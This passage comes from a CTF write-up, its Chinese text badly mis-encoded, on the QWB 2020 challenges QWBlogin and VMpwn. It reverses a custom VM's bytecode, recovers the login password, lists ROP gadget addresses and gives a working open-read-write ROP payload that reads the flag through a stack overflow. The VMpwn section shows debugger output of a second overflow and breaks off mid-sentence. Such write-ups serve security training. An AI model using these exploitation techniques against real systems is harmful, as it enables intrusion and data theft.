case</code>åˆ¤æ–­å½“å‰æŒ‡ä»¤é•¿åº¦</p><pre><code class="hljs c"><span class="hljs-keyword">switch</span> op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0xc</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0xe</span>,         <span class="hljs-number">4</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x04</span>,        <span class="hljs-number">0xb</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x5</span>:        <span class="hljs-number">0x15</span>: <span class="hljs-keyword">int8_t</span> <span class="hljs-number">4</span>        <span class="hljs-number">0x25</span>: <span class="hljs-keyword">int16_t</span> <span class="hljs-number">5</span>        <span class="hljs-number">0x35</span>: <span class="hljs-keyword">int32_t</span> <span class="hljs-number">7</span>        <span class="hljs-number">0x45</span>: <span class="hljs-keyword">int64_t</span> <span class="hljs-number">0xb</span>     <span class="hljs-keyword">case</span> <span class="hljs-number">0x6</span>:        <span class="hljs-number">3</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x7</span>:        <span class="hljs-number">0x17</span>: <span class="hljs-keyword">int8_t</span> <span class="hljs-number">3</span>        <span class="hljs-number">0x27</span>: <span class="hljs-keyword">int16_t</span> <span class="hljs-number">4</span>        <span class="hljs-number">0x37</span>: <span class="hljs-keyword">int32_t</span> <span class="hljs-number">6</span>        <span class="hljs-number">0x47</span>: <span class="hljs-keyword">int64_t</span> <span class="hljs-number">10</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x8</span>:        <span class="hljs-keyword">if</span> op[<span class="hljs-number">0</span>] == <span class="hljs-number">0x20</span>:            <span class="hljs-number">2</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-number">10</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x9</span>:        <span class="hljs-keyword">if</span> op[<span class="hljs-number">0</span>] != <span class="hljs-number">0x20</span> &amp;&amp; a[<span class="hljs-number">0x14</span>] - a[<span class="hljs-number">0x12</span>] &lt; <span class="hljs-number">10</span>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0xa</span>:        <span class="hljs-number">2</span>    <span class="hljs-keyword">default</span>:        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</code></pre><h4 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h4><p>åœ¨æœ€å¼€å§‹çš„æ—¶å€™å‚»ä¹ä¹çš„é¡ºç€<code>dump</code>çš„å‡½æ•°é€†ï¼Œåæ¥é€†å®Œ<code>MOV</code>ä¹‹åè§‰å¾—å…¶ä¸­<code>MUL/DIV/MOD</code>ç­‰ä¸€äº›å†…å®¹éƒ½å¯ä»¥ä¸ç”¨é€†ï¼Œç„¶åæˆ‘è®©ä¸€ä¸ªå­¦å¼Ÿå¸®å¿™é€†<code>XOR/OR/AND</code>ç­‰ä¸€äº›å…¶ä»–çš„ï¼Œæˆ‘å»é€†<code>JMP</code>è¿™æ•´ä¸ªï¼Œåæ¥è§‰å¾—è¿™ä¸ªæ€è·¯é”™äº†ï¼Œå…¶å®å¦‚æœ<code>test.bin</code>çš„ç¨‹åºå¹¶æ²¡æœ‰è‡ªæˆ‘ä¿®æ”¹çš„è¯ï¼Œå…¶å®å¯ä»¥å…ˆæ ¹æ®<code>size</code>å’Œ<code>instrcution</code>æŠŠæŒ‡ä»¤åˆ†äº†ï¼Œå†çœ‹æ˜¯å¦éœ€è¦é€†ä¸€äº›æŒ‡ä»¤ï¼Œæœ€åå‘ç°åªæœ‰<code>mov pop push call ret jmpï¼ˆä¸­é—´å°‘éƒ¨åˆ†ï¼‰syacall</code>éœ€è¦å¾ˆæ¸…æ¥šçš„é€†å‡ºæ¥ï¼Œå…¶ä»–çš„éƒ½å¯ä»¥ä¸ç”¨é€†ã€‚</p><h4 id="æ•´ç†"><a href="#æ•´ç†" class="headerlink" title="æ•´ç†"></a>æ•´ç†</h4><p>æœ€åéœ€è¦çš„æ¯ä¸ªçš„æƒ…å†µéƒ½æ•´ç†æˆå¦‚ä¸‹æ¨¡å¼</p><pre><code class="hljs python"><span class="hljs-comment"># 20_syscall.c</span>switch op[<span class="hljs-number">0</span>]:// SYSCALL// size == <span class="hljs-number">2</span>case <span class="hljs-number">0x20</span>:    r00 == <span class="hljs-number">0</span>        op[<span class="hljs-number">1</span>] == <span class="hljs-number">0xa</span>                fd = open(data[r01], r02)        insert fd into vm.io_file    r00 == <span class="hljs-number">1</span>        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x8</span>:            read(r01, data[r02], r03)        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x9</span>            read(r01, stack[r02], r03)    r00 == <span class="hljs-number">2</span>        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x8</span>:            write(r01, data[r02], r03)                op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x9</span>:            write(r01, stack[r02], r03)    r00 == <span class="hljs-number">3</span>        close(r01)</code></pre><h4 id="ç®€æ˜“-emulator"><a href="#ç®€æ˜“-emulator" class="headerlink" title="ç®€æ˜“ emulator"></a>ç®€æ˜“ emulator</h4><p>æœ€åæ ¹æ®æ•´ç†çš„<code>op[0] op[1]</code>è¿›è¡Œç¼–å†™ç®€æ˜“çš„åˆ†å¼€<code>test.bin</code>çš„ç¨‹åº</p><pre><code class="hljs x86asm">ov <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x45</span><span class="hljs-keyword">call</span> <span class="hljs-number">0x45</span> <span class="hljs-number">0x1</span> <span class="hljs-number">0x53</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa756f5920656553</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x8</span><span class="hljs-keyword">syscall</span> stack<span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x23</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x28</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0xb</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">dword</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x51</span>|Q<span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x57</span>| W<span class="hljs-keyword">jne</span> <span class="hljs-number">0x3</span><span class="hljs-keyword">jmp</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">xor</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x77</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x26</span>| Q<span class="hljs-keyword">jne</span> <span class="hljs-number">0xffffffc9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x48</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x50</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x58</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x60</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x21</span><span class="hljs-keyword">syscall</span> data| read(<span class="hljs-number">0</span>, data[<span class="hljs-number">0x40</span>], <span class="hljs-number">0x21</span>)<span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]| G00DR3VR<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x427234129827abcd</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x10240740dc179b8a</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x48</span>]| W31LD0N3<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x127412341241dead</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x213a22705e70edfa</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x50</span>]| Try2Pwn!<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x8634965812abc123</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa75ae10820d2b377</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x58</span>]| GOGOGOGO<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x123216781236789a</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x5d75593f5d7137dd</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x34</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x6</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> r17<span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> r17, r16<span class="hljs-keyword">sub</span> r16, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x100</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r4</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa214f474f4721</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x574f4e54494e5750</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0xf</span><span class="hljs-keyword">syscall</span> stack<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">r4</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x800</span><span class="hljs-keyword">syscall</span> stack| read(<span class="hljs-number">0</span>, stack[], <span class="hljs-number">0x800</span>)<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0</span>         <span class="hljs-keyword">jnl</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">r0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">r4</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> r16, r17      <span class="hljs-keyword">pop</span> <span class="hljs-built_in">qword</span> r17<span class="hljs-keyword">ret</span></code></pre><p>äºæ˜¯ç¨‹åºå°±æ¯”è¾ƒæ¸…æ™°äº†ï¼Œå¦‚æœè¾“å…¥äº†<code>password</code>ä¸º<code>QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO</code>å°±èƒ½èµ°åˆ°æœ€åæº¢å‡ºçš„åœ°æ–¹</p><p>æœ€ååœ¨<code>read(0, stack, 0x800)</code>çš„åœ°æ–¹ä¼šå‡ºç°æº¢å‡ºï¼Œç„¶ååœ¨<code>ret</code>çš„æ—¶å€™æŠŠæ ˆä¸Šçš„å†…å®¹<code>pop</code>åˆ°<code>vm.pc</code>ï¼Œäºæ˜¯å°±éœ€è¦åœ¨<code>test.bin</code>é‡Œé¢æ‰¾åˆ°å¯ä»¥ç”¨<code>gadgets</code></p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h4><p>åœ¨ç¨‹åº<code>RET</code>ä¹‹åè¿˜æœ‰ä¸€å¤§æ®µæ— å…³çš„<code>opcode</code>ï¼Œåšåˆ°è¿™æ­¥çš„æ—¶å€™æ‰çŸ¥é“ï¼Œè¿™äº›å°±æ˜¯ä¸ºäº†å‡‘<code>gadgets</code>çš„</p><p>å…¶ä¸­æ ‡è®°ä¸º<code>R</code>çš„æ˜¯ä¸éœ€è¦é™åˆ¶çš„</p><pre><code class="hljs python"><span class="hljs-comment"># 0x0d 0xR6 0x00 0x11 0xRR</span>pop_r00_ret = <span class="hljs-number">0x2f5</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x01 0X11 0xRR</span>pop_r01_ret = <span class="hljs-number">0x377</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x02 0x11 0xRR</span>pop_r02_ret = <span class="hljs-number">0x45c</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x03 0x11 0xRR</span>pop_r03_ret = <span class="hljs-number">0x4e1</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x20 0x0a 0x11 0xRR</span>sys_open_ret = <span class="hljs-number">0x6ed</span><span class="hljs-comment"># 0x20 0xR8 0x11 0xRR</span>sys_data_ret = <span class="hljs-number">0x5b1</span><span class="hljs-comment"># 0x20 0xR9 0x11 0xRR</span>sys_stack_ret = <span class="hljs-number">0x617</span></code></pre><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>ç”±äº<code>syscall</code>ä¸­åªæœ‰<code>open | read | write | close</code>å¯ç”¨ï¼Œå¾ˆè‡ªç„¶æƒ³åˆ°<code>orw</code>ï¼Œç„¶åæ„é€ <code>rop</code>é“¾å°±è¡Œäº†ï¼Œå…¶ä¸­ç”±äºæœ€å¼€å§‹æ‰“å¼€äº†<code>test.bin</code>æ–‡ä»¶ï¼Œæ‰€ä»¥<code>fd=4</code>ï¼Œæœ€åˆå†™<code>exp</code>çš„æ—¶å€™è¢«å‘äº†ä¸€ä¸‹ï¼Œä»¥åŠè°ƒè¯•çš„æ—¶å€™å¸Œæœ›èƒ½æœ‰ç»“æ„ä½“çš„ç¬¦å·ï¼Œæˆ‘ç¼–è¯‘äº†<code>struct.c =&gt; struct.o</code>å†åœ¨è°ƒè¯•çš„æ—¶å€™<code>add-symbol-file struct.o 0</code>å³å¯</p><pre><code class="hljs python">payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x108</span><span class="hljs-comment"># read(0, data[0x100], 0x20)</span><span class="hljs-comment"># r00 = 1 r01 = 0 r02 = 0x100 r03 = 0x20</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">1</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x20</span>)payload += p64(sys_data_ret)<span class="hljs-comment"># open(data[0x100], 0)</span><span class="hljs-comment"># r00 = 0 r01 = 0x200 r02 = 0</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0</span>)payload += p64(sys_open_ret)<span class="hljs-comment"># read(4, data[0x100], 0x30)</span><span class="hljs-comment"># r00 = 1 r01 = 4 r02 = 0x100 r03 = 0x30</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">1</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x4</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x30</span>)payload += p64(sys_data_ret)<span class="hljs-comment"># write(1, data[0x100], 0x30)</span><span class="hljs-comment"># r00 = 2 r01 = 1 r02 = 0x100 r03 = 0x30</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">2</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x1</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x30</span>)payload += p64(sys_data_ret)</code></pre><p>å¼ºçš„å¤§ä½¬ï¼Œä¸éœ€è¦<code>instruction.h</code>éƒ½èƒ½åœ¨5ä¸ªå°æ—¶å†…åšå‡ºæ¥ï¼Œè€Œæˆ‘å°±æ˜¯åªèœé¸¡</p><p><a href="https://github.com/Vang3lis/CTF_repo/tree/master/QWB_2020/QWBlogin">QWBlogin é¢˜ç›®</a></p><h2 id="VMpwn"><a href="#VMpwn" class="headerlink" title="VMpwn"></a>VMpwn</h2><p>è¿™ä¸ªé¢˜ç›®è·Ÿä¸Šä¸€ä¸ªé¢˜ç›®ä¸€æ ·å…ˆé€†å‘ï¼Œä½†æ˜¯è¿™ä¸ªé¢˜ç›®è·Ÿ<code>QWBlogin</code>ç›¸æ¯”å®ç°<code>vm</code>çš„æ—¶å€™ç®€å•ä¸€äº›</p><p>å…¶ä¸­æœ‰ä¸€ä¸ª <code>chunk 0x30</code>ç”¨æ¥è®°å½•å¯„å­˜å™¨çš„å€¼<code>vm[0] vm[1] vm[2]</code> ç±»ä¼¼<code>rdi, rsi, rdx</code>åœ¨<code>syscall</code>æ—¶ä¼šç”¨åˆ°ï¼Œ<code>vm[3]</code>ä¸º<code>sp</code>ï¼Œ<code>vm[5]</code>ä¸º <code>pc</code></p><p>åœ¨æœ€åçš„å…³é”®æ“ä½œä¸ºå¯¹äº<code>read(0, stack, 0x1000)</code>ï¼ˆæ ˆåªæœ‰<code>0x100</code>ä¸ªå­—èŠ‚ï¼‰</p><pre><code class="hljs assembly">pwndbg&gt; distance 0x555555759050 0x55555575ad680x555555759050-&gt;0x55555575ad68 is 0x1d18 bytes (0x3a3 words) RAX  0x7ffff7b156c0 (read) â—‚â€” cmp    dword ptr [rip + 0x2c3039], 0 â–º 0x5555555555db    call   rax &lt;0x7ffff7b156c0&gt;        fd: 0x0        buf: 0x55555575ad68 â—‚â€” 0x0        nbytes: 0x1000pwndbg&gt; telescope 0x55555575801000:0000â”‚   0x555555758010 â—‚â€” 0x001:0008â”‚   0x555555758018 â€”â–¸ 0x55555575ad68 â—‚â€” 0x002:0010â”‚   0x555555758020 â—‚â€” 0x100003:0018â”‚   0x555555758028 â€”â–¸ 0x55555575ad68 â—‚â€” 0x004:0020â”‚   0x555555758030 â—‚â€” 0x005:0028â”‚   0x555555758038 â€”â–¸ 0x5555557572d6 â—‚â€” 0x772c6b6f11028f10</code></pre><p>ç„¶å<code>puts(stack)</code>ï¼Œå¯ä»¥çœ‹åˆ°è¯¥è™šæ‹Ÿæ ˆä¸Šæœ‰<code>heap</code>åœ°å€å’Œ<code>elf</code>åœ°å€ï¼Œä½†æ˜¯åªèƒ½æ³„æ¼ä¸€ä¸ª</p><pre><code class="hljs assembly">pwndbg&gt; telescope 0x55555575ad68 0x3000:0000â”‚ rsi  0x55555575ad68 â—‚â€” &#39;1234454636\n&#39;01:0008â”‚      0x55555575ad70 â—‚â€” 0xa3633 &#x2F;* &#39;36\n&#39; *&#x2F;02:0010â”‚      0x55555575ad78 â—‚â€” 0x0... â†“1e:00f0â”‚      0x55555575ae58 â€”â–¸ 0x555555758050 â—‚â€” 0x20746168772c6b6f (&#39;ok,what &#39;)1f:00f8â”‚      0x55555575ae60 â—‚â€” 0x020:0100â”‚      0x55555575ae68 â€”â–¸ 0x555555757851 â—‚â€” 0xff</code></pre><p>æ¥ä¸‹æ¥åŒç¬¬ä¸€æ­¥çš„<code>read(0, stack, 0x1000)</code> <code>write(0, stack, 0x20)</code>ç„¶å<code>ret</code></p><p>è¿™ä¸ªç¨‹åºä¸­æœ‰ä¸€ä¸ªä¸¤ä¸ªæ¯”è¾ƒå¥‡æ€ªçš„åœ°æ–¹ï¼Œç”±äº<code>ret</code>çš„æ—¶å€™ç¨‹åºçš„å®ç°ï¼Œæ˜¯å°†<code>sp-=8</code>ï¼Œä½†æ˜¯<code>PUSH</code>ä¸º<code>sp-=8</code> <code>POP</code>ä¸º<code>sp+=8</code>ï¼Œå› æ­¤<code>ret</code>çš„æ—¶å€™æ¯”è¾ƒå¥‡æ€ªï¼Œå¦å¤–å°±æ˜¯ä¸<code>QWBlogin</code>ç›¸æ¯”æ²¡æœ‰ ä»€ä¹ˆèƒ½ç”¨çš„<code>gadget</code>ï¼Œå› æ­¤æƒ³æ³•åªèƒ½ä¸ºæŒ‰ç…§<code>vm</code>çš„è§„åˆ™ï¼Œå†™<code>shellocde</code>ï¼Œç„¶ååœ¨æœ€å<code>ret</code>çš„æ—¶å€™è·³è½¬è¿‡å»ï¼Œä½†æ˜¯è¯¥é¢˜ç”¨ <code>seccomp</code>é™åˆ¶äº†åªèƒ½ 